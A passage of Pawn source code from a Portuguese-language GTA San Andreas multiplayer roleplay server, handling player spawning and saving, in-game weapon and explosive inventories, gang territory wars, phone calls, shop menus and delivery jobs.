	PreloadAnimLib(playerid, "RYDER");
   	PreloadAnimLib(playerid, "SHOP");
   	PreloadAnimLib(playerid, "SHOTGUN");
   	PreloadAnimLib(playerid, "SMOKING");
   	PreloadAnimLib(playerid, "STRIP");
   	PreloadAnimLib(playerid, "SUNBATHE");
   	PreloadAnimLib(playerid, "SWAT");
   	PreloadAnimLib(playerid, "TEC");
  	PreloadAnimLib(playerid, "UZI");
	
	HideLogoForPlayer(playerid);
	
	TextDrawHideForPlayer(playerid, tdgray);
	TextDrawHideForPlayer(playerid, tdlightgray);
	
	if(IntroductionPart[playerid] == 0)
	{
	    SetPlayerDrunkLevel(playerid, pDrunk[playerid]);
	    ShowLogoForPlayer(playerid);
	    ShowWeekdayForPlayer(playerid);
    	TogglePlayerClock(playerid, true);
    }

    if(Dying[playerid] != 0)
    {
		new Float:X, Float:Y, Float:Z;
		
		SetPlayerVirtualWorld(playerid, DEATH_VIRTUAL_WORLD);
		SetPlayerSysHealth(playerid, 1.0);
		GetPlayerPos(playerid, X, Y, Z);
		SetPlayerCameraPos(playerid, X, Y, Z - 0.5);
		SetPlayerCameraLookAt(playerid, X, Y, Z + 100.0);
		ShowTextLightGray(playerid);
		TextDrawShowForPlayer(playerid, tdblack);
		ClearAnimations(playerid);
		DieTimer[playerid] = SetTimerEx("StartDie", 5000, false, "d", playerid);
    }
    
    if(ColourType == COLOUR_TYPE_DEFINED)
        SetPlayerColour(playerid, ColourValue);
        
	if(ColourType == COLOUR_TYPE_GANG)
	{
		new id, post;
		
		GetPlayerGangData(playerid, id, post);
		
		if(id != 0)
		    SetPlayerColour(playerid, GetGangColour(id));
		    
		else
		    SetPlayerColour(playerid, ColourValue);
	}
	
	for(new s = 0; s < SUBMISSION_MAX; s++)
	{
	    if(Submission[s] == playerid)
	        Submission[s] = INVALID_PLAYER_ID;
	}
	
    pUpdate[playerid] = UPDATE_MONEY | UPDATE_WEAPONS | UPDATE_HEALTH;
    ChangePlayerJob(playerid, hGetInt(xpath, "Job"));
    SetVehicleParamsForPlayer(ICE_CREAM, playerid, 0, 1);
    SetVehicleParamsForPlayer(IML, playerid, 0, 1);
    SetVehicleParamsForPlayer(CEMENT, playerid, 0, 1);
    SetVehicleParamsForPlayer(POST, playerid, 0, 1);
    LoadPlayerAccessories(playerid);
    ShowGangZones(playerid);
    Login[playerid] = 1;
}

public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
	for(new n = 0; n < MAX_SLOTS; n++)
	{
	    if(IsPlayerConnected(n) && IsPlayerLogged(n) && IsPlayerAdmin(n) &&	GetPlayerState(n) == PLAYER_STATE_SPECTATING && AdminData[n][admSpec] == playerid)
	    {
	        SetPlayerInterior(n, newinteriorid);
		    TogglePlayerSpectating(n, true);

		    if(!IsPlayerInAnyVehicle(playerid))
		        PlayerSpectatePlayer(n, playerid);

			else
			    PlayerSpectateVehicle(n, GetPlayerVehicleID(playerid));
	    }
	}
}

stock SavePlayerData(playerid)
{
    new xpath[128];
	
	xpath = GetPlayerXFilePath(playerid);
	
	if(Dying[playerid] != 0)
	{
	    pHealth[playerid] = 100.0;
		pArmour[playerid] = 0.0;
	}

 	hSetInt(xpath, "Money", pMoney[playerid]);
  	hSetInt(xpath, "Handgun", (pWeapons[playerid][0] & 0x3F) | (pWeapons[playerid][1] << 6));
  	hSetInt(xpath, "Lightgun", (pWeapons[playerid][2] & 0x3F) | (pWeapons[playerid][3] << 6));
  	hSetInt(xpath, "Steel", pWeapons[playerid][4]);
  	hSetInt(xpath, "Drunk", pDrunk[playerid]);
   	hSetFloat(xpath, "Health", pHealth[playerid]);
   	hSetFloat(xpath, "Armour", pArmour[playerid]);
   	
}

stock SavePlayerLastPos(playerid)
{
    new xpath[128], lastpos[128];
	new int;
	new Float:X, Float:Y, Float:Z, Float:A;
	
    xpath = GetPlayerXFilePath(playerid);
	GetPlayerPos(playerid, X, Y, Z);
	GetPlayerFacingAngle(playerid, A);
	int = GetPlayerInterior(playerid);
	
	format(lastpos, sizeof lastpos, "%.4f,%.4f,%.4f,%.4f,%d,%d,%d", X, Y, Z, A, int, Enter[playerid], House[playerid]);
	hSetString(xpath, "LastPos", lastpos);
}

stock AttachPlayerBackpack(playerid)
{
	DettachPlayerBackpack(playerid);
	BackpackObject[playerid] = CreateObject(371, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
	AttachObjectToPlayer(BackpackObject[playerid], playerid, 0, -0.2, 0.2, 0, 0, 0);
}

stock DettachPlayerBackpack(playerid)
{
	DestroyObject(BackpackObject[playerid]);
}

stock IsValidSkin(skinid)
{
    return !(skinid == 3   || skinid == 4   || skinid == 5   || skinid == 6   || skinid == 8   || skinid == 42  || skinid == 65  ||
			 skinid == 74  || skinid == 86  || skinid == 119 || skinid == 149 || skinid == 208 || skinid == 273 || skinid == 274 ||
			 skinid == 289 || skinid >= 300);
}

stock IsForbiddenWeapon(weaponid)
{
	return (weaponid == 16 || weaponid == 18 || weaponid == 19 || weaponid == 20 || weaponid == 21 || weaponid == 26 ||
			weaponid == 28 || weaponid == 32 || weaponid == 36 || weaponid == 37 || weaponid == 38 || weaponid == 39 ||
			weaponid == 40 || weaponid == 41 || weaponid == 42 || weaponid == 43 || weaponid == 44 || weaponid == 45);
}

stock GivePlayerExplosive(playerid, explosiveid)
{
	new kpath[128];
	new explosives, amount, mask;
	
	kpath = GetPlayerKFilePath(playerid);
	explosives = hGetInt(kpath, "Explosives");
	amount = (explosives >> (explosiveid * 2)) & 3;
	mask = 0xFFFFFFFF;
	
	if(amount < 0)
	    amount = 0;
	    
	if(amount >= Explosives[explosiveid][expLimit])
	    return 1;

	amount = (amount + 1) & 3;
	mask &= ~(3 << (explosiveid * 2));
	explosives = (explosives & mask) | (amount << (explosiveid * 2));
 	hSetInt(kpath, "Explosives", explosives);
	return 0;
}

stock TakePlayerExplosive(playerid, explosiveid)
{
    new kpath[128];
	new explosives, amount, mask;

	kpath = GetPlayerKFilePath(playerid);
	explosives = hGetInt(kpath, "Explosives");
	amount = (explosives >> (explosiveid * 2)) & 3;
	mask = 0xFFFFFFFF;

	if(amount > Explosives[explosiveid][expLimit])
	    amount = Explosives[explosiveid][expLimit];

	if(amount <= 0)
	    return;
	    
	amount = (amount - 1) & 3;
	mask &= ~(3 << (explosiveid * 2));
	explosives = (explosives & mask) | (amount << (explosiveid * 2));
 	hSetInt(kpath, "Explosives", explosives);
}

stock GetPlayerExplosive(playerid, explosiveid)
{
    return (hGetInt(GetPlayerKFilePath(playerid), "Explosives") >> (explosiveid * 2)) & 3;
}

stock RemovePlayerExplosive(playerid, explosiveid)
{
    new kpath[128];
	new mask;

	kpath = GetPlayerKFilePath(playerid);
	mask = 0xFFFFFFFF & (~(3 << (explosiveid * 2)));
	
	hSetInt(kpath, "Explosives", hGetInt(kpath, "Explosives") & mask);
}

stock RemovePlayerExplosives(playerid)
	hSetInt(GetPlayerKFilePath(playerid), "Explosives", 0);

public CreateDroppedWeapon(weaponid, ammo, Float:X, Float:Y, Float:Z, Float:rX, Float:rY, Float:rZ)
{
	new id;

	for(id = 0; id < MAX_DROPPED_WEAPONS; id++)
	{
	    if(DroppedWeapons[id][dwExist] == 0)
		    break;
	}

	if(DroppedWeapons[id][dwExist] == 1)
	    DeleteDroppedWeapon(id);
	    
	DroppedWeapons[id][dwObjectId] = CreateObject(Weapons[weaponid][wObjectId], X, Y, Z, rX, rY, rZ);
	DroppedWeapons[id][dwWeaponId] = weaponid;
	DroppedWeapons[id][dwAmmo] = ammo;
	DroppedWeapons[id][dwExist] = 1;
	DroppedWeapons[id][dwTimer] = SetTimerEx("DeleteDroppedWeapon", DROPPED_WEAPON_TIME, false, "d", id);
	return id;
}

public DeleteDroppedWeapon(id)
{
	DestroyObject(DroppedWeapons[id][dwObjectId]);
	DeleteTimer(DroppedWeapons[id][dwTimer]);
	DroppedWeapons[id][dwObjectId] = DroppedWeapons[id][dwWeaponId] = DroppedWeapons[id][dwAmmo] = DroppedWeapons[id][dwExist] = 0;
}

stock GivePlayerSysWeapon(playerid, weaponid, ammo)
{
    new slot;
    
	if(weaponid == 0 || ammo == 0)
	    return -1;

    slot = Weapons[weaponid][wSlot];

	if(slot == 0 || slot == 1 || slot == 10)
	{
	    if(pWeapons[playerid][4] != 0)
	        return 4;
	        
	    pWeapons[playerid][4] = weaponid;
	    ammo = 1;
	}
	else
	{
		if(slot == 3 || slot == 4 || slot == 5 || slot == 6 || slot == 7)
		{
		    if(pWeapons[playerid][0] != weaponid && pWeapons[playerid][0] != 0 && pWeapons[playerid][1] > 0)
			    return 2;
			
            if(pWeapons[playerid][1] + ammo > Weapons[weaponid][wAmmoLimit])
	    	{
	        	if(pWeapons[playerid][1] > Weapons[weaponid][wAmmoLimit] - Weapons[weaponid][wAmmo])
	        	    return 1;
	        	else
	        	   	ammo = Weapons[weaponid][wAmmoLimit] - pWeapons[playerid][1];
	    	}
			    
			if(weaponid == pWeapons[playerid][0])
			    pWeapons[playerid][1] += ammo;
			else
				pWeapons[playerid][1] = ammo;
				
            pWeapons[playerid][0] = weaponid;
		}
		
		else if(slot == 2)
		{
		    if(pWeapons[playerid][2] != weaponid && pWeapons[playerid][2] != 0 && pWeapons[playerid][3] > 0)
			    return 3;
			
            if(pWeapons[playerid][3] + ammo > Weapons[weaponid][wAmmoLimit])
	    	{
	        	if(pWeapons[playerid][3] > Weapons[weaponid][wAmmoLimit] - Weapons[weaponid][wAmmo])
	        	    return 1;
	        	else
	        	   	ammo = Weapons[weaponid][wAmmoLimit] - pWeapons[playerid][3];
	    	}
	    	
			if(weaponid == pWeapons[playerid][2])
			    pWeapons[playerid][3] += ammo;
			else
				pWeapons[playerid][3] = ammo;

            pWeapons[playerid][2] = weaponid;
		}
		
		else
			return -1;
	}
	
	GivePlayerWeapon(playerid, weaponid, ammo);
	return 0;
}

stock SavePlayerWeapons(playerid)
{
	new weaponid, ammo;
	
	for(new gun = 0; gun < 4; gun += 2)
	{
		if(pWeapons[playerid][gun] == 0 || pWeapons[playerid][gun+1] == 0)
		    pWeapons[playerid][gun] = pWeapons[playerid][gun+1] = 0;
		    
		else
		{
		    GetPlayerWeaponData(playerid, Weapons[pWeapons[playerid][gun]][wSlot], weaponid, ammo);

			if(pWeapons[playerid][gun] != weaponid)
			    pWeapons[playerid][gun] = weaponid;
			    
			if(pWeapons[playerid][gun+1] > ammo)
			    pWeapons[playerid][gun+1] = ammo;
			    
            if(pWeapons[playerid][gun+1] > Weapons[weaponid][wAmmoLimit])
			    pWeapons[playerid][gun+1] = Weapons[weaponid][wAmmoLimit];
			    
			if(pWeapons[playerid][gun+1] <= 0)
			    pWeapons[playerid][gun] = pWeapons[playerid][gun+1] = 0;
		}
	}
	
	return 0;
}

public SpeakRadio(playerid, speakid)
{
	SpeakId[playerid] = 0;
    TextDrawHideForPlayer(playerid, tdspeak[playerid]);
    
	if(speakid < 1 || speakid > sizeof Speaks - 1)
		return;
		
	if(!IsPlayerInAnyVehicle(playerid) && GetPlayerWeapon(playerid) != 0 && Limp[playerid] == 0 && Dying[playerid] == 0)
	{
 		switch(speakid)
   		{
     		case 1: //Affirmative!
       			ApplyAnimation(playerid, "UZI", "UZI_fire", 4.1, 0, 1, 1, 1, 1, 1);
          	case 2: //Negative!
           		ApplyAnimation(playerid, "ROCKET", "RocketFire", 4.1, 0, 1, 1, 1, 1, 1);
           	case 3: //Go go go!
           	{
            	ApplyAnimation(playerid, "POLICE", "CopTraf_Away", 4.1, 0, 1, 1, 1, -1, 1);
            	SetTimerEx("StopAnimation", 1500, false, "d", playerid);
			}
			case 4: //Need help!
            	ApplyAnimation(playerid, "SHOTGUN", "shotgun_fire", 4.1, 0, 1, 1, 1, 1, 1);
            case 5: //Team, fall back!
            {
            	ApplyAnimation(playerid, "POLICE", "CopTraf_Come", 4.1, 0, 1, 1, 1, -1, 1);
            	SetTimerEx("StopAnimation", 3000, false, "d", playerid);
			}
			case 6: //Cover me!
            	ApplyAnimation(playerid, "COLT45", "colt45_fire_2hands", 4.1, 0, 1, 1, 1, 1, 1);
            case 7: //Follow me!
            	ApplyAnimation(playerid, "COLT45", "colt45_reload", 4.1, 0, 1, 1, 1, 1, 1);
           	case 8: //Enemy down!
            	ApplyAnimation(playerid, "COLT45", "colt45_fire", 4.1, 0, 1, 1, 1, 1, 1);
			case 9: //Regroup team
   				ApplyAnimation(playerid, "COLT45", "colt45_reload", 4.1, 0, 1, 1, 1, 1, 1);
			case 10: //Taking fire, need assistance!
   				ApplyAnimation(playerid, "TEC", "TEC_reload", 4.1, 0, 1, 1, 1, 1, 1);
			case 11: //You take the point!
			{
				new Float:A;

				GetPlayerFacingAngle(playerid, A);
				SetPlayerFacingAngle(playerid, A + 90.0);
				
   				if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_DUCK)
		    		ApplyAnimation(playerid, "CAMERA", "camcrch_cmon", 4.1, 0, 1, 1, 1, -1, 1);
					
				else
    				ApplyAnimation(playerid, "CAMERA", "camstnd_cmon", 4.1, 0, 1, 1, 1, -1, 1);
    				
                SetTimerEx("StopAnimation", 2500, false, "d", playerid);
			}
			case 12: //Enemy spotted!
			    ApplyAnimation(playerid, "CAMERA", "piccrch_out", 4.1, 0, 1, 1, 1, 1, 1);
			case 13: //Mission completed, sir!
			    ApplyAnimation(playerid, "COLT45", "colt45_fire_2hands", 4.1, 0, 1, 1, 1, 1, 1);
	    }
	}
	
	Speak(playerid, Speaks[speakid]);
}

public Speak(playerid, speak[])
{
	if(Radio[playerid] != -1)
	{
    	new string[128];
    	new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ;
	
		format(string, sizeof string, "[Walk-Talkie] %s: %s", PlayerName(playerid), speak);
		GetPlayerWorldPos(playerid, X, Y, Z);
	
		for(new n = 0; n < MAX_SLOTS; n++)
		{
		    if(IsPlayerConnected(n) && IsPlayerLogged(n) && Radio[playerid] == Radio[n])
		    {
		        GetPlayerWorldPos(n, PX, PY, PZ);

		        if(GetDistance(X, Y, Z, PX, PY, PZ) < 100.0)
		    		SendClientMessage(n, COLOUR_DARK_GOLD, string);
			}
		}
		
		reportf("[Radio %d] %s: %s", REPORT_CHAT, Radio[playerid], PlayerName(playerid), speak);
	}
	
	SetPlayerChatBubble(playerid, speak, COLOUR_DARK_GOLD, 30.0, 5000);
}

public AttackTerritory(playerid)
{
	GangAttack[playerid] = Zone[playerid];
	SendClientMessage(playerid, COLOUR_SKY_BLUE, "Use: '/gangue atacar' para iniciar um ataque nesse território.");
}

public GangZoneWar(zoneid)
{
	new id, post, domain, attacker, dscore, ascore, cscore;
	new bool:attack, bool:defense, bool:police;
	
	domain = GetZoneDomain(zoneid);
	attacker = GangZones[zoneid][gzAttacker];
	dscore = GangZones[zoneid][gzScore];
	ascore = GangZones[zoneid][gzScore] >> 8;
	cscore = GangZones[zoneid][gzScore] >> 16;
	dscore &= 0xFF;
	ascore &= 0xFF;
	cscore &= 0xFF;
	attack = defense = police = false;
	
	if(domain == 0 || attacker == 0 || domain == attacker)
	{
	    FinishWar(zoneid);
	    return;
	}
	
	for(new n = 0; n < MAX_SLOTS; n++)
	{
	    if(IsPlayerConnected(n) && IsPlayerLogged(n) && Zone[n] == zoneid && Dying[n] == 0)
	    {
	        GetPlayerGangData(n, id, post);
	        
	        if(id == domain)
	            defense = true;

			else if(id == attacker)
			    attack = true;
			
			else if(IsPlayerCop(n))
			    police = true;
	    }
	}
	
	if(!attack)
	    ++dscore;
	    
	if(!defense)
	    ++ascore;
	
	if(police && !attack && !defense)
		++cscore;
				
	if(dscore >= 4)
	{
	    FinishWar(zoneid);
	    return;
	}
	
	if(ascore >= 12)
	{
		SetZoneDomain(zoneid, attacker);
	    FinishWar(zoneid);
	    return;
	}
	
	if(cscore >= 4)
	{
	    RemoveZoneDomain(zoneid);
    	FinishWar(zoneid);
    	return;
	}
	
	dscore &= 0xFF;
	ascore &= 0xFF;
	cscore &= 0xFF;
	GangZones[zoneid][gzScore] = (cscore << 16) | (ascore << 8) | dscore;
}

public SetGateParams(gateid, params)
	Gates[gateid][gParams] = params;

public OpenGate(gateid)
{
	switch(Gates[gateid][gStyle])
	{
	    case 1:
	    {
	        new time;
	        
	        time = floatround(GetDistance(Gates[gateid][gOpenX], Gates[gateid][gOpenY], Gates[gateid][gOpenZ], Gates[gateid][gX], Gates[gateid][gY], Gates[gateid][gZ]) / Gates[gateid][gOpenS]) * 1000;
            MoveObject(Gates[gateid][gObjectId], Gates[gateid][gOpenX], Gates[gateid][gOpenY], Gates[gateid][gOpenZ], Gates[gateid][gOpenS]);
			SetTimerEx("SetGateParams", time, false, "dd", gateid, (1 << 1) | 0);
		}
	}
	
	Gates[gateid][gParams] = (1 << 1) | 1;
}

public CloseGate(gateid)
{
    switch(Gates[gateid][gStyle])
	{
	    case 1:
	    {
	        new time;

	        time = floatround(GetDistance(Gates[gateid][gOpenX], Gates[gateid][gOpenY], Gates[gateid][gOpenZ], Gates[gateid][gX], Gates[gateid][gY], Gates[gateid][gZ]) / Gates[gateid][gOpenS]) * 1000;
			MoveObject(Gates[gateid][gObjectId], Gates[gateid][gX], Gates[gateid][gY], Gates[gateid][gZ], Gates[gateid][gOpenS]);
			SetTimerEx("SetGateParams", time, false, "dd", gateid, (0 << 1) | 0);
	    }
	}
	
	Gates[gateid][gParams] = (0 << 1) | 1;
}

public SetPlayerCellPhoneAction(playerid)
{
	SetPlayerAttachedObject(playerid, OBJECT_SLOT_CELLPHONE, 330, 6);
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
}

public StopPlayerCellPhoneAction(playerid)
{
    RemovePlayerAttachedObject(playerid, OBJECT_SLOT_CELLPHONE);
    SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
}

public PhoneCall(playerid)
{
	new xpath[128];
	new callerid, credits;
	
	xpath = GetPlayerXFilePath(playerid);
	credits = hGetInt(xpath, "Credits");
	CallCost[playerid] += 5;
	
	if(CallCost[playerid] >= credits)
	{
        callerid = Call[playerid] >> 2;
        Call[callerid] = 0;
        Call[playerid] = 0;
        CallCost[playerid] = 0;
        hSetInt(xpath, "Credits", 0);
        SendClientMessage(playerid, COLOUR_WHITE, "[ Creditos esgotados, a ligacao foi finalizada ]");
		SendClientMessage(callerid, COLOUR_WHITE, "[ Ligacao finalizada por falta de creditos do outro jogador ]");
        DeleteTimer(CallTimer[playerid]);
	}
	
	else if(credits - CallCost[playerid] <= 10)
	    SendClientMessage(playerid, COLOUR_WHITE, "[ Aviso: Seus créditos estão acabando... Recarregue seu celular ]");
}

public PhoneCallStop(playerid, callerid)
{
    Call[playerid] = 0;
    Call[callerid] = 0;
    DeleteTimer(CallTimer[playerid]);
    SendClientMessage(playerid, COLOUR_WHITE, "[ Chamada encerrada ]");
    SendClientMessage(callerid, COLOUR_WHITE, "[ Chamada encerrada ]");
    StopPlayerCellPhoneAction(playerid);
    TextDrawHideForPlayer(callerid, tdphone);
}

public PhoneCallError(playerid, errno)
{
    if(errno == 1)
    	SendClientMessage(playerid, COLOUR_WHITE, "[ O número que você ligou está fora de serviço, tente novamente mais tarde ]");
    	
	if(errno == 2)
	    SendClientMessage(playerid, COLOUR_WHITE, "[ Você não possui créditos o suficiente para realizar uma chamada ]");
	    
    if(errno == 3)
	    SendClientMessage(playerid, COLOUR_WHITE, "[ Quem você chama não possui créditos o suficiente para receber uma chamada à cobrar ]");
	    
	if(errno == 4)
    	SendClientMessage(playerid, COLOUR_WHITE, "[ O número que você ligou está ocupado no momento, tente novamente mais tarde ]");
    	
    StopPlayerCellPhoneAction(playerid);
}

public OnPlayerEnterCheckpoint(playerid)
{
	switch(CheckpointStatus[playerid])
	{
	    case CHECKPOINT_NONE:
	    {
	        DisablePlayerCheckpoint(playerid);
	        return 1;
	    }

		case CHECKPOINT_AMMUNATION:
		{
		    SetPlayerCameraPos(playerid, 314.9799, -134.0405, 1000.6016);
		    SetPlayerCameraLookAt(playerid, 317.0170, -132.7189, 1000.6016);
		    ShowMenuForPlayer(Guns[0], playerid);
		    TogglePlayerControllable(playerid, false);
		}
		
		case CHECKPOINT_DONUTS:
		{
		    ShowMenuForPlayer(Donuts, playerid);
		    TogglePlayerControllable(playerid, false);
		}
		
		case CHECKPOINT_PIZZA:
		{
		    ShowMenuForPlayer(Pizzas, playerid);
		    TogglePlayerControllable(playerid, false);
		}
		
		case CHECKPOINT_CHICKEN:
		{
		    ShowMenuForPlayer(Chickens, playerid);
		    TogglePlayerControllable(playerid, false);
		}
		
		case CHECKPOINT_BURGER:
		{
		    ShowMenuForPlayer(Burgers, playerid);
		    TogglePlayerControllable(playerid, false);
		}
		
		case CHECKPOINT_DRINKS:
		{
		    ShowMenuForPlayer(Drinks, playerid);
		    TogglePlayerControllable(playerid, false);
		}
		
		case CHECKPOINT_RESTAURANT:
		{
		    InRestaurant[playerid] = 1;
            ShowMenuForPlayer(Restaurant, playerid);
		    TogglePlayerControllable(playerid, false);
		}
		
		case CHECKPOINT_24/7_SHOP:
		{
            ShowMenuForPlayer(Itens, playerid);
		    TogglePlayerControllable(playerid, false);
		}
		
		case CHECKPOINT_TOY_SHOP:
		{
		    ShowMenuForPlayer(Toys, playerid);
		    TogglePlayerControllable(playerid, false);
		}
		
		case CHECKPOINT_WORLD_COQ:
		{
		    InRestaurant[playerid] = 1;
            ShowMenuForPlayer(Restaurant, playerid);
		    TogglePlayerControllable(playerid, false);
		}
		
		case CHECKPOINT_SEX_SHOP:
		{
		    ShowMenuForPlayer(Dildos, playerid);
		    TogglePlayerControllable(playerid, false);
		}
		
		case CHECKPOINT_HOTEL:
		{
		    ShowMenuForPlayer(Hotel, playerid);
		    TogglePlayerControllable(playerid, false);
		}
		
		case CHECKPOINT_LOTTERY:
		{
		    ShowLotteryDialog(playerid);
		}
		
		case CHECKPOINT_BINCO:
		{
		    ClothesShop[playerid][csType] = CLOTHES_BINCO;
		    ShowClothes(playerid);
		}
		
		case CHECKPOINT_SUB_URBAN:
		{
		    ClothesShop[playerid][csType] = CLOTHES_SUB_URBAN;
		    ShowClothes(playerid);
		}
		
		case CHECKPOINT_PRO_LAPS:
		{
		    ClothesShop[playerid][csType] = CLOTHES_PRO_LAPS;
		    ShowClothes(playerid);
		}
		
		case CHECKPOINT_VICTIM:
		{
		    ClothesShop[playerid][csType] = CLOTHES_VICTIM;
		    ShowClothes(playerid);
		}
		
		case CHECKPOINT_DIDIER_SACHS:
		{
		    ClothesShop[playerid][csType] = CLOTHES_DIDIER_SACHS;
		    ShowClothes(playerid);
		}
	
	    case CHECKPOINT_CANS:
	    {
  			if(IsPlayerInAnyVehicle(playerid))
	   		{
	   		    DrawTextForPlayer(playerid, "Saiá do veículo", COLOUR_RED, TEXTDRAW_STYLE_2, 2000);
				return 1;
			}
				
	 		new string[128];
			new cans, dump;
				
			dump = random(sizeof Dumps);
			cans = Collect[playerid];
			Collect[playerid] += random(4) + 1;

			if(Collect[playerid] / 20 > cans / 20)
				AddLevel(playerid);
				
		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, Dumps[dump][0], Dumps[dump][1], Dumps[dump][2], 3.0);
		    format(string, sizeof string, "Você coletou %d lata(s)", Collect[playerid] - cans);
		    DrawTextForPlayer(playerid, string, COLOUR_UNEMPLOYED, TEXTDRAW_STYLE_2, 2000);
	    }
	    
	    case CHECKPOINT_TRASH:
	    {
	        if(!IsPlayerInJobVehicle(playerid, TRASHMASTER))
	   		{
	   		    DrawTextForPlayer(playerid, "Você deve estar em um caminhão de lixo", COLOUR_RED, TEXTDRAW_STYLE_2, 2000);
				return 1;
			}

			new dump;

			dump = random(sizeof Dumps);
			Collect[playerid]++;

			if(Collect[playerid] % 15 == 0)
				AddLevel(playerid);

		    DisablePlayerCheckpoint(playerid);
		    SetPlayerCheckpoint(playerid, Dumps[dump][0], Dumps[dump][1], Dumps[dump][2], 3.0);
		    DrawTextForPlayer(playerid, "Lixo coletado.", COLOUR_UNEMPLOYED, TEXTDRAW_STYLE_2, 2000);
	    }
	}
	
	return 1;
}

public OnPlayerEnterRaceCheckpoint(playerid)
{
	if(PizzaDelivery[playerid] == 2 && IsPlayerInAnyVehicle(playerid))
	{
 		DrawTextForPlayer(playerid, "Saiá do veiculo.", COLOUR_RED, TEXTDRAW_STYLE_2, 3000);
	    return;
    }
    
    DisablePlayerRaceCheckpoint(playerid);
    
	if(TestPlayerT == playerid)
	{
	    TestPartT++;
	    LicenseTestT();
	    return;
	}
	
	if(TestPlayerN == playerid)
	{
	    TestPartN++;
	    LicenseTestN();
	    return;
	}
	
	if(TestPlayerA == playerid)
	{
	    TestPartA++;
	    LicenseTestA();
	    return;
	}
	
	if(TaxiDelivery[playerid] != -1)
	{
	    new string[128];
	    new place;
	    
	    if(TaxiDelivery[playerid] <= 0)
		{
		    place = random(sizeof TaxiPlaces);
		    TaxiDelivery[playerid] = random(3) + 2;
		    SetPlayerRaceCheckpoint(playerid, 1, TaxiPlaces[place][0], TaxiPlaces[place][1], TaxiPlaces[place][2], 0.0, 0.0, 0.0, 4.0);
		    format(string, sizeof string, "%d pacotes obtidos, entregue-os!", TaxiDelivery[playerid]);
		    SendClientMessage(playerid, COLOUR_CABBIE, string);
		}
		
		else
		{
            TaxiDelivery[playerid]--;
            
            if(TaxiDelivery[playerid] <= 0)
            {
                new pay;
                
                pay = (random(201) + 100);
     			pay -= (pay % 5);
     			
     			Pay(playerid, pay);
     			SetPlayerRaceCheckpoint(playerid, 1, 1743.1726, -1856.5837, 13.4140, 0.0, 0.0, 0.0, 4);
     			format(string, sizeof string, "Pacotes entregues, você recebeu $%d,00 dólares!", pay);
     			SendClientMessage(playerid, COLOUR_CABBIE, string);
     			SendClientMessage(playerid, COLOUR_CABBIE, "Volte para a Companhia de Taxi para buscar mais.");
     			return;
            }
            
            place = random(sizeof TaxiPlaces);
            SetPlayerRaceCheckpoint(playerid, 1, TaxiPlaces[place][0], TaxiPlaces[place][1], TaxiPlaces[place][2], 0.0, 0.0, 0.0, 4.0);
            SendClientMessage(playerid, COLOUR_CABBIE, "Entregue o próximo pacote.");
		}
		
		return;
	}
	
	if(PizzaDelivery[playerid] == 1)
	{
        new place;

	    place = random(sizeof PizzaPlaces);
	    PizzaDelivery[playerid] = 2;
		SetPlayerRaceCheckpoint(playerid, 1, PizzaPlaces[place][0], PizzaPlaces[place][1], PizzaPlaces[place][2], 0.0, 0.0, 0.0, 4.0);
		DrawTextForPlayer(playerid, "Pedido obtido ~n~~w~Conclua a entrega", COLOUR_PIZZABOY, TEXTDRAW_STYLE_2, 3000);
		return;
	}
	
	if(PizzaDelivery[playerid] == 2)
	{
	    new string[128];
     	new pay;
     	
     	pay = (random(51) + 50);
     	pay -= (pay % 5);
     	PizzaDelivery[playerid] = 1;
     	Pay(playerid, pay);
     	ClearAnimations(playerid);
     	RemovePlayerAttachedObject(playerid, OBJECT_SLOT_CARRY);
	    SetPlayerRaceCheckpoint(playerid, 1, 2098.5437, -1806.6945, 13.5546, 0.0, 0.0, 0.0, 4.0);
	    format(string, sizeof string, "Entrega concluida (+$%d,00)~n~~w~Vá pegar o próximo pedido", pay);
	    DrawTextForPlayer(playerid, string, COLOUR_PIZZABOY, TEXTDRAW_STYLE_2, 3000);
	    return;
	}
	
	if(Transport[playerid] != 0)
	{
	    new string[128];
	    new vehid, value;
	    new Float:X, Float:Y, Float:Z, Float:D;
		new bool:dest;
		
		if(!IsPlayerInAnyVehicle(playerid))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um RoadTrain.");
	        return;
	    }

	    vehid = GetPlayerVehicleID(playerid);

	    if(GetVehicleModel(vehid) != 515)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um RoadTrain.");
	        return;
	    }

        dest = (MetersTraveled[playerid] > 0);
        
	    if(!IsTrailerAttachedToVehicle(vehid) || GetJobVehicle(GetVehicleTrailer(vehid), TRAILER) != Transport[playerid] - 1)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está com o trailer anexado ao caminhão.");
	        return;
	    }
		
        GetVehiclePos(vehid, X, Y, Z);
		D = GetDistance(TruckOrigin[playerid][0], TruckOrigin[playerid][1], TruckOrigin[playerid][2], X, Y, Z);
		TruckOrigin[playerid][0] = X;
		TruckOrigin[playerid][1] = Y;
		TruckOrigin[playerid][2] = Z;
  		MetersTraveled[playerid] += floatround(D);
	    	
        if(dest)
        {
            MetersTraveled[playerid] -= MetersTraveled[playerid] % 10;
            
            if(MetersTraveled[playerid] <= 0)
                MetersTraveled[playerid] = 10;
                
			GetVehicleHealth(vehid, D);
			D = 1000.0 - D;
            value += MetersTraveled[playerid] / 10;
            value -= floatround(D) * 2;
            value -= value % 100;
            
            if(value <= 0)
                value = 100;
                
            Pay(playerid, value);
            format(string, sizeof string, "Metros percorridos: %dm <> Dano: %.2fporcento", MetersTraveled[playerid], D / 10);
            SendClientMessage(playerid, COLOUR_TRUCKER, string);
            format(string, sizeof string, "Valor recebido: $%d,00 dólares", value);
            SendClientMessage(playerid, COLOUR_TRUCKER, string);
            DrawTextForPlayer(playerid, "Entrega concluída.", COLOUR_TRUCKER, TEXTDRAW_STYLE_2, 4000);
        }

		else
		{
			TogglePlayerControllable(playerid, false);
	    	DrawTextForPlayer(playerid, "Carregando...", COLOUR_TRUCKER, TEXTDRAW_STYLE_2, 10000);
	    	SetTimerEx("LoadingTruck", 12000, false, "d", playerid);
		}
		
		return;
	}
	
	if(Terminal[playerid] != 0)
	{
	    TogglePlayerControllable(playerid, false);
    	DrawTextForPlayer(playerid, "Esperando passageiros...", COLOUR_MACHINIST, TEXTDRAW_STYLE_2, 10000);
